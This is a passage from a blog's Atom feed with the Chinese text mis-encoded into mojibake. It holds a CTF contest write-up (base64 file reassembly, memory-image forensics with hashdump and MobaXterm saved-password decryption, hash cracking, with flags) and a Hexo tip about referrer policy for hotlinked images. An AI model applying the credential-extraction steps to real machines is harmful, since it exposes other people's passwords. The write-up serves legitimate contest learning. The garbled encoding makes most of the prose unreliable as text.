æ–‡ä»¶å¤´ï¼Œæ‰€ä»¥è¿™äº›å¯†ç åº”è¯¥ç»„åˆåœ¨ä¸€èµ·å°±æ˜¯ä¸€å¼  png å›¾ç‰‡ã€‚è„šæœ¬ç›´æ¥æ”¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">stringall = &quot;&quot;</span><br><span class="line">for i in range(0, 100):</span><br><span class="line">    i = str(i)</span><br><span class="line">    passwd_path = &quot;C:\\Users\\Lucky\\Desktop\\æ˜¥ç§‹æ¯\\misc\\å‹åŠ›å¤§ï¼Œå†™ä¸ªè„šæœ¬å§\\password_&quot;+i+&quot;.txt&quot;</span><br><span class="line">    string = open(passwd_path, &quot;r&quot;).read()</span><br><span class="line">    stringall += string</span><br><span class="line">print(base64.b64decode(stringall))</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€å¼ äºŒç»´ç ï¼Œç›´æ¥æ‰«ï¼Œå°±å¾—åˆ°äº† flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117172005199.png" alt="image-20250117172005199"></p><blockquote><p>flag{<em>PASSWORDs_is_fl@g!</em>}</p></blockquote><h4 id="ez-forensics">ez_forensics</h4><blockquote><p>è€ƒç‚¹ï¼šé•œåƒå–è¯</p></blockquote><p>ä¸‹è½½é™„ä»¶è§£å‹ï¼Œå…ˆæ–‡ä»¶æ‰«æä¸€ä¸‹çœ‹çœ‹ï¼ŒæŸ¥æ‰¾ä¸€ä¸‹å…³é”®è¯</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121134845419.png" alt="image-20250121134845419"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121134909012.png" alt="image-20250121134909012"></p><p>å°†è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼ˆå‹ç¼©åŒ…å’Œtxtï¼‰æå–å‡ºæ¥ï¼Œå‘ç°å‹ç¼©åŒ…è§£å‹éœ€è¦å¯†ç ã€‚æŸ¥çœ‹hint.txt</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135038002.png" alt="image-20250121135038002"></p><p>60 = 13 +47ï¼Œæƒ³åˆ°ç”¨rot13å’Œrot47è§£å¯†ï¼Œå¾—åˆ°</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135247193.png" alt="image-20250121135247193"></p><p>å¯ä»¥çŸ¥é“ï¼Œå‹ç¼©åŒ…çš„è§£å‹å¯†ç éœ€è¦è¿›è¡Œhashdumpã€‚</p><p>ç„¶åæ‰¾åˆ°ç”¨æˆ·å¯†ç </p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135742846.png" alt="image-20250121135742846"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135722955.png" alt="image-20250121135722955"></p><p>è§£å‹åå¾—åˆ°æ–‡ä»¶</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135900120.png" alt="image-20250121135900120"></p><p>ç»“åˆæç¤ºæœç´¢ï¼Œå‘ç°äº†</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121140041681.png" alt="image-20250121140041681"></p><p>ç»“åˆç”¨æˆ·åï¼Œå¯ä»¥çŸ¥é“ä½¿ç”¨çš„è¯•MobaXtermï¼Œæ‰€ä»¥iniæ–‡ä»¶æ˜¯å…¶é…ç½®æ–‡ä»¶</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121140134279.png" alt="image-20250121140134279"></p><p>ç½‘ä¸Šæœç´¢å…¶å¯†ç è§£å¯†ï¼Œæ‰¾åˆ°ä¸€ç¯‡åšå®¢ï¼ŒçŸ¥é“å¯ä»¥ä½¿ç”¨è„šæœ¬è§£å¯†</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121140432635.png" alt="image-20250121140432635"></p><p>master passwordå°±ä½¿ç”¨æ–‡ä»¶å flag_is_here</p><p>æœ€åè§£å¯†å¾—åˆ°</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121140457763.png" alt="image-20250121140457763"></p><p>å°†flagå†…çš„å†…å®¹è¿›è¡Œbase64è§£å¯†å¾—åˆ°flagã€‚</p><blockquote><p>flag{you_are_a_g00d_guy}</p></blockquote><h2 id="crypto">crypto</h2><h4 id="é€šå¾€å“ˆå¸Œçš„æ—…ç¨‹">é€šå¾€å“ˆå¸Œçš„æ—…ç¨‹</h4><blockquote><p>è€ƒç‚¹ï¼šå“ˆå¸Œ</p></blockquote><p>æ ¹æ®æç¤ºå¾—åˆ°ä¸€ä¸ªå“ˆå¸Œå¯†æ–‡</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117172603778.png" alt="image-20250117172603778"></p><p>ç›´æ¥å“ˆå¸Œçˆ†ç ´æˆ–è€…åœ¨çº¿è§£å¯†å¾—åˆ°</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117172632734.png" alt="image-20250117172632734"></p><blockquote><p>flag{18876011645}</p></blockquote>]]></content>
    
    
    <summary type="html">ğŸ¥§2024å¹´æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ›å†¬å­£èµ›wp-1.17</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="æ¯”èµ›wp" scheme="https://blog.m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>è§£å†³hexoå¼•å…¥å›¾åºŠï¼Œæ‰‹æœºå’Œwebä¸æ˜¾ç¤ºå›¾ç‰‡çš„é—®é¢˜</title>
    <link href="https://blog.m3x1.cn/posts/762268d0.html"/>
    <id>https://blog.m3x1.cn/posts/762268d0.html</id>
    <published>2024-11-30T16:00:00.000Z</published>
    <updated>2025-03-25T04:40:12.551Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0-å‰è¨€">0.å‰è¨€</h3><p>hexoå¼•å…¥å›¾ç‰‡çš„æ–¹å¼æœ‰å¾ˆå¤šç§ï¼š</p><ul><li>ä»æœ¬åœ°æ–‡ä»¶åŠ è½½ï¼Œæ–¹æ³•å‚è§å‚è€ƒæ–‡çŒ®ä¸€ã€‚</li><li>ä½¿ç”¨å›¾åºŠï¼Œmarkdownä¸­ç›´æ¥å¼•ç”¨å›¾åºŠçš„é“¾æ¥ã€‚</li></ul><h3 id="1-é—®é¢˜æè¿°">1.é—®é¢˜æè¿°</h3><p>Hexoä½¿ç”¨å›¾åºŠçš„æ–¹å¼åŠ è½½åœ¨blogä¸­åŠ è½½å›¾ç‰‡ï¼Œä¼šåœ¨éæœ¬äººçš„ç”µè„‘æˆ–è€…æ‰‹æœºç«¯æŠ¥â€œhtmlè®¿é—®å›¾ç‰‡èµ„æº403é—®é¢˜(http referrer)â€ï¼Œå¯¼è‡´é‡‡ç”¨å›¾åºŠæ–¹å¼åŠ è½½çš„å›¾ç‰‡å…¨éƒ¨æ— æ³•åŠ è½½ã€‚</p><h3 id="2-é—®é¢˜åŸå› ">2.é—®é¢˜åŸå› </h3><p>httpè¯·æ±‚ä½“çš„headerä¸­æœ‰ä¸€ä¸ªreferrerå­—æ®µï¼Œç”¨æ¥è¡¨ç¤ºå‘èµ·httpè¯·æ±‚çš„æºåœ°å€ä¿¡æ¯ï¼Œè¿™ä¸ªreferrerä¿¡æ¯æ˜¯å¯ä»¥çœç•¥ä½†æ˜¯ä¸å¯ä¿®æ”¹çš„ï¼Œå°±æ˜¯è¯´ä½ åªèƒ½è®¾ç½®æ˜¯å¦å¸¦ä¸Šè¿™ä¸ªreferrerä¿¡æ¯ï¼Œä¸èƒ½å®šåˆ¶referreré‡Œé¢çš„å€¼ã€‚</p><p>æœåŠ¡å™¨ç«¯åœ¨æ‹¿åˆ°è¿™ä¸ªreferrerå€¼åå°±å¯ä»¥è¿›è¡Œç›¸å…³çš„å¤„ç†ï¼Œæ¯”å¦‚å›¾ç‰‡èµ„æºï¼Œå¯ä»¥é€šè¿‡referrerå€¼åˆ¤æ–­è¯·æ±‚æ˜¯å¦æ¥è‡ªæœ¬ç«™ï¼Œè‹¥ä¸æ˜¯åˆ™è¿”å›403æˆ–è€…é‡å®šå‘è¿”å›å…¶ä»–ä¿¡æ¯ï¼Œä»è€Œå®ç°å›¾ç‰‡çš„é˜²ç›—é“¾ã€‚ä¸Šé¢å‡ºç°403å°±æ˜¯å› ä¸ºï¼Œè¯·æ±‚çš„æ˜¯åˆ«äººæœåŠ¡å™¨ä¸Šçš„èµ„æºï¼Œä½†æŠŠè‡ªå·±çš„referrerä¿¡æ¯å¸¦è¿‡å»äº†ï¼Œè¢«å¯¹æ–¹æœåŠ¡å™¨æ‹¦æˆªè¿”å›äº†403ã€‚</p><p>åœ¨å‰ç«¯å¯ä»¥é€šè¿‡metaæ¥è®¾ç½®referrer policy(æ¥æºç­–ç•¥)ï¼Œå…·ä½“å¯ä»¥è®¾ç½®å“ªäº›å€¼ä»¥åŠå¯¹åº”çš„ç»“æœå‚è€ƒ<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FHTTP%2FHeaders%2FReferrer-Policy">è¿™é‡Œ</a>ã€‚æ‰€ä»¥é’ˆå¯¹ä¸Šé¢çš„403æƒ…å†µçš„è§£å†³æ–¹æ³•ï¼Œå°±æ˜¯æŠŠreferrerè®¾ç½®æˆ<code>no-referrer</code>ï¼Œè¿™æ ·å‘é€è¯·æ±‚ä¸ä¼šå¸¦ä¸Šreferrerä¿¡æ¯ï¼Œå¯¹æ–¹æœåŠ¡å™¨ä¹Ÿå°±æ— æ³•æ‹¦æˆªäº†ã€‚</p><p>æµè§ˆå™¨ä¸­referreré»˜è®¤çš„å€¼æ˜¯<code>no-referrer-when-downgrade</code>ï¼Œå°±æ˜¯é™¤äº†é™çº§è¯·æ±‚çš„æƒ…å†µä»¥å¤–éƒ½ä¼šå¸¦ä¸Šreferrerä¿¡æ¯ã€‚é™çº§è¯·æ±‚æ˜¯æŒ‡httpsåè®®çš„åœ°å€å»è¯·æ±‚httpåè®®ï¼Œæ‰€ä»¥ä¸Šé¢403çš„æƒ…å†µè¿˜æœ‰å¦ä¸€ç§è§£å†³æ–¹æ³•å°±æ˜¯ï¼Œè¯·æ±‚çš„å›¾ç‰‡åœ°å€æ¢æˆhttpåè®®ï¼Œè‡ªå·±çš„åœ°å€ä½¿ç”¨httpåè®®ï¼Œè¿™æ ·é™çº§è¯·æ±‚ä¹Ÿä¸ä¼šå¸¦ä¸Šreferrerã€‚</p><h3 id="3-è§£å†³åŠæ³•">3.è§£å†³åŠæ³•</h3><h4 id="3-1-butterflyä¸»é¢˜">3.1 butterflyä¸»é¢˜</h4><p>åœ¨G:\blog\themes\butterfly\layout\includesç›®å½•ä¸‹æœ‰ä¸€ä¸ªhead.pugæ–‡ä»¶ï¼Œä¿®æ”¹è¯¥æ–‡ä»¶çš„metaä¿¡æ¯ï¼Œä¼šä½¿ç”Ÿæˆçš„æ‰€æœ‰é¡µé¢éƒ½å¸¦æœ‰è¯¥headã€‚åœ¨head.pugæ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼Œç»“æœå‚è§å›¾ç‰‡ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">meta</span>(name=<span class="string">&quot;referrer&quot;</span> content=<span class="string">&quot;no-referrer&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https:////upload-images.jianshu.io/upload_images/13838098-1b07689b2e132b5d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/656/format/webp" alt="img"></p><p>butterflyæ·»åŠ å¤´.png</p><h4 id="3-2-yiliaä¸»é¢˜">3.2 yiliaä¸»é¢˜</h4><p>åœ¨G:\blog\themes\yilia\layout_partialç›®å½•ä¸‹æœ‰ä¸€ä¸ªhead.ejsï¼ŒåŒæ ·åœ¨head.ejsæ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹metaä¿¡æ¯å³å¯</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=<span class="string">&quot;referrer&quot;</span> content=<span class="string">&quot;no-referrer&quot;</span> /&gt;</span><br></pre></td></tr></table></figure><h3 id="4-ç»“æœ">4.ç»“æœ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨hexo g é‡æ–°ç”Ÿæˆä¸€ä¸‹å·¥ç¨‹</span><br></pre></td></tr></table></figure><p>åœ¨G:\blog\public\2021ç›®å½•ä¸‹å°±æ˜¯æ‰€æœ‰21å¹´ç”Ÿæˆçš„blogï¼Œæ‰¾åˆ°è¯¥ç›®å½•ä¸‹çš„ä»»æ„ä¸€ä¸ªindex.htmlï¼Œç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€å°±å¯ä»¥çœ‹åˆ°å·²ç»è‡ªåŠ¨ç”Ÿæˆäº†referreræ ‡ç­¾äº†ã€‚</p><p><img src="https:////upload-images.jianshu.io/upload_images/13838098-34cdaee390f1a3dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/508/format/webp" alt="img"></p><p>ç”Ÿæˆçš„htmlä¸­åŒ…å«æœ‰referrerå¤´.png</p><p>ç„¶åä½¿ç”¨hexo dæŒ‡ä»¤å°†å·¥ç¨‹åŒæ­¥åˆ°githubå³å¯</p>]]></content>
    
    
    <summary type="html">ğŸ¥§è§£å†³hexoå¼•å…¥å›¾åºŠï¼Œæ‰‹æœºå’Œwebä¸æ˜¾ç¤ºå›¾ç‰‡çš„é—®é¢˜</summary>
    
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
</feed>
